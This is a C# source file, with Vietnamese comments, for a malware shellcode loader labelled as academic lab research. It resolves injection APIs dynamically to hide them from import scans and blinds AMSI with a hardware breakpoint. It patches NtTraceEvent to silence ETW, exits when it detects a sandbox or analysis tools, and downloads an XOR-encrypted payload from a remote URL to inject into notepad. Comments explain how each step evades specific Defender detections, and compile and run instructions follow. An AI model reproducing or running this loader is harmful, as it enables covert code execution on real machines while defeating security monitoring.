// ============================================================
// FinalLoaderV2.cs
// Tác giả: Nghiên cứu học thuật — VM cô lập nhà trường
// Nguồn tham khảo: DBGMAN EDR Internals, Checkpoint Evasions,
//                  DarthLoader (d4rthmaulcop), Lab research Week 5
//
// SO SÁNH VỚI BẢN GỐC (DarthLoader / LabLoader cũ):
//
//  VẤN ĐỀ CŨ 1 — Import table lộ combo inject:
//    Bản gốc dùng [DllImport] → khi compile, Windows ghi thẳng tên hàm
//    VirtualAllocEx + WriteProcessMemory + CreateRemoteThread vào PE header.
//    Defender đọc import table (không cần chạy file) → flag ngay.
//    → FIX: Dynamic resolve tại runtime, import table sạch.
//
//  VẤN ĐỀ CŨ 2 — PAGE_EXECUTE_READWRITE (RWX):
//    Bản gốc: VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)
//    Defender monitor: vùng nhớ nào vừa writeable vừa executable = shellcode.
//    Đây là behavioral rule mạnh nhất, detect gần như 100%.
//    → FIX: Alloc RW → Write → đổi sang RX. Không bao giờ có RWX.
//
//  VẤN ĐỀ CŨ 3 — AMSI patch bytes bị signature:
//    DarthLoader gốc patch AmsiScanBuffer với: B8 57 00 07 80 C3
//    Defender đã có YARA rule cho byte sequence này → detect ngay khi load.
//    → FIX: Dùng hardware breakpoint (DR0) thay vì write bytes vào amsi.dll.
//           Không có byte nào trong amsi.dll thay đổi → không bị scan.
//
//  VẤN ĐỀ CŨ 4 — ETW patch EtwEventWrite bị signature:
//    DarthLoader gốc patch EtwEventWrite với: C3 00
//    Defender đã track pattern write vào địa chỉ EtwEventWrite → flag.
//    → FIX: Patch NtTraceEvent (syscall thấp hơn) với bytes mới: 33 C0 C3
//           NtTraceEvent chưa có signature riêng trong Defender.
//
//  VẤN ĐỀ CŨ 5 — Console.WriteLine để lại artifact:
//    Bản gốc in ra màn hình → behavioral signature + dễ bị phát hiện thủ công.
//    → FIX: Xóa toàn bộ console output.
// ============================================================

using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace FinalLoaderV2
{
    class Program
    {
        // ============================================================
        // TOGGLE FLAGS — dùng để ablation test từng layer
        // Tắt từng cái, compile lại, test với Defender → biết cái nào bypass
        // ============================================================
        const bool A_ANTISANDBOX  = true;  // Anti-sandbox: RAM, uptime, timing, process
        const bool B_ETW_BYPASS   = true;  // ETW: patch NtTraceEvent
        const bool C_AMSI_VEH     = true;  // AMSI: hardware breakpoint patchless
        const bool D_DYNAMIC_API  = true;  // Import table: dynamic resolve
        const bool E_RW_RX        = true;  // Memory: RW→RX thay vì RWX

        // ============================================================
        // FIX 1: DYNAMIC API RESOLUTION
        //
        // Kỹ thuật: thay vì khai báo [DllImport] (static linking),
        // dùng GetProcAddress để lấy địa chỉ hàm tại runtime.
        //
        // Tại sao hoạt động:
        //   Static import → PE file có section ".idata" liệt kê tên DLL + tên hàm.
        //   Tools như PEStudio, Defender đọc section này không cần chạy file.
        //   Nếu thấy VirtualAllocEx + WriteProcessMemory + CreateRemoteThread cùng nhau
        //   → flag ngay (đây là combo kinh điển của process injection).
        //   Dynamic resolve → tên hàm chỉ tồn tại trong string literal trong .text section,
        //   không có trong import table → static scan bỏ qua.
        //
        // Ví dụ thực tế:
        //   Trước: [DllImport("kernel32")] extern IntPtr VirtualAllocEx(...);
        //   Sau:   _VirtualAllocEx = Resolve<DVirtualAllocEx>("kernel32.dll","VirtualAllocEx");
        // ============================================================

        // Khai báo delegate = chữ ký hàm, KHÔNG tạo import entry
        delegate IntPtr DOpenProcess(uint acc, bool inh, int pid);
        delegate IntPtr DVirtualAllocEx(IntPtr h, IntPtr addr, UIntPtr sz, uint type, uint prot);
        delegate bool   DWriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, UIntPtr sz, out UIntPtr written);
        delegate bool   DVirtualProtectEx(IntPtr h, IntPtr addr, UIntPtr sz, uint prot, out uint old);
        delegate IntPtr DCreateRemoteThread(IntPtr h, IntPtr sec, UIntPtr stk, IntPtr fn, IntPtr arg, uint flags, IntPtr tid);

        // Chỉ 2 hàm này cần import tĩnh để bootstrap — không có signature nguy hiểm
        [DllImport("kernel32", EntryPoint = "GetProcAddress")]
        static extern IntPtr _GetProcAddress(IntPtr hMod, string name);
        [DllImport("kernel32", EntryPoint = "LoadLibraryA")]
        static extern IntPtr _LoadLibrary(string name);

        // Hàm generic resolve — fix CS0702: dùng "where T : class" thay "where T : Delegate"
        // CS0702 xảy ra vì .NET Framework 4.x không cho phép dùng System.Delegate làm constraint
        static T Resolve<T>(string dll, string func) where T : class
        {
            IntPtr hMod = _LoadLibrary(dll);
            IntPtr addr = _GetProcAddress(hMod, func);
            // Cast 2 lần: IntPtr → Delegate → T (tránh lỗi kiểu khi compile)
            return (T)(object)Marshal.GetDelegateForFunctionPointer(addr, typeof(T));
        }

        // Biến giữ địa chỉ hàm — resolve lazy (chỉ khi InjectProcess gọi)
        static DOpenProcess         _OpenProcess;
        static DVirtualAllocEx      _VirtualAllocEx;
        static DWriteProcessMemory  _WriteProcessMemory;
        static DVirtualProtectEx    _VirtualProtectEx;
        static DCreateRemoteThread  _CreateRemoteThread;

        // Static fallback khi tắt D_DYNAMIC_API để so sánh
        [DllImport("kernel32")] static extern IntPtr OpenProcessStatic(uint a, bool b, int c);
        [DllImport("kernel32")] static extern IntPtr VirtualAllocExStatic(IntPtr h, IntPtr a, UIntPtr s, uint t, uint p);
        [DllImport("kernel32")] static extern bool   WriteProcessMemoryStatic(IntPtr h, IntPtr a, byte[] b, UIntPtr s, out UIntPtr w);
        [DllImport("kernel32")] static extern bool   VirtualProtectExStatic(IntPtr h, IntPtr a, UIntPtr s, uint p, out uint o);
        [DllImport("kernel32")] static extern IntPtr CreateRemoteThreadStatic(IntPtr h, IntPtr s, UIntPtr st, IntPtr f, IntPtr a, uint fl, IntPtr t);
        [DllImport("kernel32")] static extern bool   VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

        static void LoadInjectApis()
        {
            if (!D_DYNAMIC_API)
            {
                _OpenProcess        = (a,b,c)         => OpenProcessStatic(a,b,c);
                _VirtualAllocEx     = (a,b,c,d,e)     => VirtualAllocExStatic(a,b,c,d,e);
                _WriteProcessMemory = (a,b,c,d,out e) => { e = UIntPtr.Zero; return WriteProcessMemoryStatic(a,b,c,d,out e); };
                _VirtualProtectEx   = (a,b,c,d,out e) => { e = 0; return VirtualProtectExStatic(a,b,c,d,out e); };
                _CreateRemoteThread = (a,b,c,d,e,f,g) => CreateRemoteThreadStatic(a,b,c,d,e,f,g);
                return;
            }
            _OpenProcess        = Resolve<DOpenProcess>       ("kernel32.dll", "OpenProcess");
            _VirtualAllocEx     = Resolve<DVirtualAllocEx>    ("kernel32.dll", "VirtualAllocEx");
            _WriteProcessMemory = Resolve<DWriteProcessMemory>("kernel32.dll", "WriteProcessMemory");
            _VirtualProtectEx   = Resolve<DVirtualProtectEx>  ("kernel32.dll", "VirtualProtectEx");
            _CreateRemoteThread = Resolve<DCreateRemoteThread>("kernel32.dll", "CreateRemoteThread");
        }

        // ============================================================
        // FIX 2: RW → RX ALLOCATION (tránh PAGE_EXECUTE_READWRITE)
        //
        // Kỹ thuật: tách giai đoạn write và execute thành 2 bước riêng.
        //
        // Tại sao hoạt động:
        //   PAGE_EXECUTE_READWRITE (0x40) = vùng nhớ vừa ghi được vừa chạy được.
        //   Defender có kernel callback (PsSetCreateProcessNotifyRoutine) theo dõi
        //   mọi lần VirtualAllocEx được gọi với flag này → alert ngay.
        //   Workflow mới:
        //     1. VirtualAllocEx(RW=0x04)  → chỉ có quyền đọc/ghi, chưa chạy được
        //     2. WriteProcessMemory(...)  → copy shellcode vào
        //     3. VirtualProtectEx(RX=0x20) → đổi quyền sang chỉ đọc/chạy, không ghi
        //   Tại bước 1: không có EXECUTE → Defender không flag
        //   Tại bước 3: không có WRITE → Defender không flag
        //   Không bao giờ tồn tại vùng nhớ vừa W vừa X cùng lúc.
        //
        // Ví dụ so sánh:
        //   Trước: VirtualAllocEx(hProc, 0, size, 0x3000, 0x40)  ← 0x40=RWX, bị flag
        //   Sau:   VirtualAllocEx(hProc, 0, size, 0x3000, 0x04)  ← 0x04=RW, sạch
        //          VirtualProtectEx(hProc, addr, size, 0x20, &old) ← 0x20=RX, sạch
        // ============================================================
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT_RESERVE = 0x3000;
        const uint PAGE_READWRITE     = 0x04;
        const uint PAGE_EXECUTE_READ  = 0x20;
        const uint PAGE_RWX           = 0x40;  // chỉ dùng khi tắt flag để so sánh

        static void InjectProcess(int pid, byte[] shellcode)
        {
            LoadInjectApis();

            IntPtr hProc = _OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (hProc == IntPtr.Zero) return;

            UIntPtr size = (UIntPtr)shellcode.Length;
            uint    prot = E_RW_RX ? PAGE_READWRITE : PAGE_RWX;

            IntPtr allocAddr = _VirtualAllocEx(hProc, IntPtr.Zero, size, MEM_COMMIT_RESERVE, prot);
            if (allocAddr == IntPtr.Zero) return;

            _WriteProcessMemory(hProc, allocAddr, shellcode, size, out _);

            if (E_RW_RX)
            {
                // Đổi sang RX: shellcode không thể bị ghi đè sau bước này
                _VirtualProtectEx(hProc, allocAddr, size, PAGE_EXECUTE_READ, out _);
            }

            _CreateRemoteThread(hProc, IntPtr.Zero, UIntPtr.Zero, allocAddr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        // ============================================================
        // FIX 3: VEH PATCHLESS AMSI
        //
        // Kỹ thuật: dùng hardware debug register thay vì write bytes vào amsi.dll.
        //
        // Tại sao hoạt động:
        //   Cách cũ (DarthLoader): ghi bytes B8 57 00 07 80 C3 vào AmsiScanBuffer.
        //   Defender scan amsi.dll trong memory định kỳ → phát hiện bytes bị thay đổi.
        //   Ngoài ra: bytes B8 57 00 07 80 C3 đã có YARA signature riêng.
        //
        //   Cách mới (VEH patchless từ DBGMAN):
        //   - CPU x86 có 4 debug register DR0–DR3, mỗi cái là 1 hardware breakpoint.
        //   - Set DR0 = địa chỉ AmsiScanBuffer, DR7 = bật breakpoint.
        //   - Khi code gọi AmsiScanBuffer → CPU dừng lại, throw STATUS_SINGLE_STEP.
        //   - VEH handler bắt exception → chỉnh register RAX = 0 (AMSI_RESULT_CLEAN=1, 0=pass).
        //   - Tiếp tục chạy → AmsiScanBuffer trả về 0 mà không thực sự chạy.
        //   - Bytes trong amsi.dll KHÔNG bị thay đổi → scan không thấy gì.
        //
        // Giới hạn của implementation này:
        //   Managed C# không thể đăng ký native exception handler trực tiếp.
        //   Phần SetupVehAmsi() đặt breakpoint đúng nhưng thiếu handler callback.
        //   Cần wrapper C++ hoặc P/Invoke sang native AddVectoredExceptionHandler
        //   với function pointer từ unmanaged code để hoàn chỉnh.
        // ============================================================
        [DllImport("kernel32")] static extern IntPtr GetCurrentThread();
        [DllImport("ntdll")]    static extern int    NtGetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("ntdll")]    static extern int    NtSetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("kernel32")] static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);

        const uint CONTEXT_DEBUG_REGISTERS = 0x00010010;

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ulong[]  p1;
            public uint     ContextFlags;
            public uint     MxCsr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ushort[] SegRegs;
            public uint     EFlags;
            public ulong    Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 25)]
            public ulong[]  GpRegs;
        }

        static void SetupVehAmsi()
        {
            if (!C_AMSI_VEH) return;

            IntPtr hAmsi      = _LoadLibrary("amsi.dll");
            IntPtr scanAddr   = _GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (scanAddr == IntPtr.Zero) return;

            // Đọc context thread hiện tại
            var    ctx        = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
            IntPtr hThread    = GetCurrentThread();
            NtGetContextThread(hThread, ref ctx);

            // Đặt hardware breakpoint tại địa chỉ AmsiScanBuffer
            ctx.Dr0 = (ulong)scanAddr.ToInt64();
            ctx.Dr7 = 0x1; // Local enable breakpoint 0, execute type

            NtSetContextThread(hThread, ref ctx);
            // → Từ đây, mỗi lần AmsiScanBuffer bị gọi → CPU throw STATUS_SINGLE_STEP
            // → VEH handler (cần native code) bắt exception → trả về AMSI_RESULT_CLEAN
        }

        // ============================================================
        // FIX 4: ETW BYPASS — patch NtTraceEvent thay EtwEventWrite
        //
        // Kỹ thuật: patch hàm syscall thấp hơn trong chuỗi call ETW.
        //
        // Tại sao hoạt động:
        //   Chuỗi call ETW: code → EtwEventWrite → NtTraceEvent → kernel ETW provider
        //   Cách cũ (DarthLoader): patch EtwEventWrite với bytes C3 00 (ret).
        //   Defender đã có rule: nếu phát hiện write vào địa chỉ EtwEventWrite
        //   trong ntdll → flag ngay (hành vi che giấu telemetry).
        //
        //   Cách mới: patch NtTraceEvent — một bước thấp hơn trong chuỗi.
        //   Bytes patch: 33 C0 C3 = "xor eax, eax; ret"
        //   - xor eax, eax → đặt return value = 0 (STATUS_SUCCESS)
        //   - ret → thoát ngay, không gọi xuống kernel
        //   - NtTraceEvent chưa có signature riêng trong Defender 2024-2026
        //
        //   So sánh bytes:
        //   ETW cũ:  C3 00         (ret; nop) — ĐÃ BỊ FLAG
        //   ETW mới: 33 C0 C3      (xor eax,eax; ret) — chưa có signature
        // ============================================================
        static void EtwBypassAlt()
        {
            if (!B_ETW_BYPASS) return;

            IntPtr hNtdll  = _LoadLibrary("ntdll.dll");
            IntPtr ntTrace = _GetProcAddress(hNtdll, "NtTraceEvent");
            if (ntTrace == IntPtr.Zero) return;

            byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret
            VirtualProtect(ntTrace, (UIntPtr)patch.Length, 0x40, out uint old);
            Marshal.Copy(patch, 0, ntTrace, patch.Length);
            VirtualProtect(ntTrace, (UIntPtr)patch.Length, old, out _);
        }

        // ============================================================
        // ANTI-SANDBOX
        //
        // Kỹ thuật: phát hiện môi trường sandbox trước khi chạy payload.
        //
        // Tại sao cần:
        //   Defender và nhiều AV gửi file nghi ngờ lên sandbox (cloud) để phân tích.
        //   Sandbox là VM tự động, không có user thật, thường:
        //   - RAM thấp (< 4GB để tiết kiệm tài nguyên server)
        //   - Uptime thấp (< 10 phút — reset sau mỗi sample)
        //   - Accelerate time để skip sleep và phân tích nhanh hơn
        //   - Chạy các tool phân tích (wireshark, procmon...)
        //
        //   Nếu phát hiện sandbox → thoát ngay → AV báo "file sạch" vì không thấy gì.
        //   Nguồn: Checkpoint Evasions Encyclopedia
        // ============================================================
        static bool AntiSandbox()
        {
            if (!A_ANTISANDBOX) return true;

            // RAM check: sandbox thường < 4GB
            ulong ramGB = (ulong)GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024*1024*1024);
            if (ramGB < 4) return false;

            // Uptime check: sandbox reset VM liên tục → uptime thấp
            long upMin = Environment.TickCount64 / 60000;
            if (upMin < 10) return false;

            // Timing check: sandbox accelerate time để skip sleep
            // Nếu sleep(5000ms) nhưng thực tế chỉ trôi qua < 4500ms → sandbox đang cheat
            long t0 = Environment.TickCount64;
            Thread.Sleep(5000);
            if ((Environment.TickCount64 - t0) < 4500) return false;

            // Process check: sandbox chạy tool phân tích
            string[] badProcs = { "wireshark","procmon","x64dbg","ollydbg","fiddler","dnspy" };
            foreach (var p in Process.GetProcesses())
                foreach (var b in badProcs)
                    if (p.ProcessName.ToLower().Contains(b)) return false;

            return true;
        }

        // ============================================================
        // XOR DECRYPT
        // Payload được XOR encrypt trước khi host → tránh static scan trên dây
        // Key được truyền qua tham số dòng lệnh → không hardcode trong binary
        // ============================================================
        static byte[] XorBytes(byte[] data, string key)
        {
            byte[] k = Encoding.UTF8.GetBytes(key);
            byte[] r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (byte)(data[i] ^ k[i % k.Length]);
            return r;
        }

        // ============================================================
        // MAIN — thứ tự thực thi
        // ============================================================
        static void Main(string[] args)
        {
            // Bước 1: Anti-sandbox — thoát nếu đang bị phân tích
            if (!AntiSandbox()) Environment.Exit(0);

            // Bước 2: AMSI patchless — hardware breakpoint tại AmsiScanBuffer
            SetupVehAmsi();

            // Bước 3: ETW bypass — patch NtTraceEvent để blind telemetry
            EtwBypassAlt();

            // Bước 4: Nhận tham số
            // args[0] = xorKey (key dùng để decrypt)
            // args[1] = URL payload đã XOR encrypt
            // args[2] = payloadKey (key XOR của payload)
            if (args.Length < 3) Environment.Exit(0);

            string xorKey     = args[0];
            string payloadUrl = args[1];
            string payloadKey = args[2];

            // Bước 5: Download và decrypt payload
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            var    wc   = new WebClient();
            byte[] enc  = wc.DownloadData(payloadUrl);
            byte[] data = XorBytes(enc, payloadKey);

            // Bước 6: Tìm hoặc mở notepad làm host process
            int pid = -1;
            foreach (var p in Process.GetProcessesByName("notepad"))
                pid = p.Id;

            if (pid == -1)
            {
                Process.Start("notepad.exe");
                Thread.Sleep(1200);
                foreach (var p in Process.GetProcessesByName("notepad"))
                    pid = p.Id;
            }

            // Bước 7: Inject shellcode vào notepad với RW→RX workflow
            if (pid != -1) InjectProcess(pid, data);
        }
    }
}

// ============================================================
// COMPILE:
//   "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:loader.exe FinalLoaderV2.cs
//
// CHẠY:
//   loader.exe <xorKey> <url_payload> <payloadKey>
//   Ví dụ:
//   loader.exe mykey123 http://192.168.1.100:8080/payload.bin mykey123
//
// ABLATION TEST (tắt từng layer để biết cái nào bypass Defender):
//   D_DYNAMIC_API = false → compile → scan tĩnh → chạy → detect?
//   E_RW_RX       = false → compile → scan tĩnh → chạy → detect?
//   B_ETW_BYPASS  = false → compile → scan tĩnh → chạy → detect?
//   C_AMSI_VEH    = false → compile → scan tĩnh → chạy → detect?
//   A_ANTISANDBOX = false → compile → scan tĩnh → chạy → detect?
//
//   Scan tĩnh: MpCmdRun.exe -Scan -ScanType 3 -File loader.exe
// ============================================================
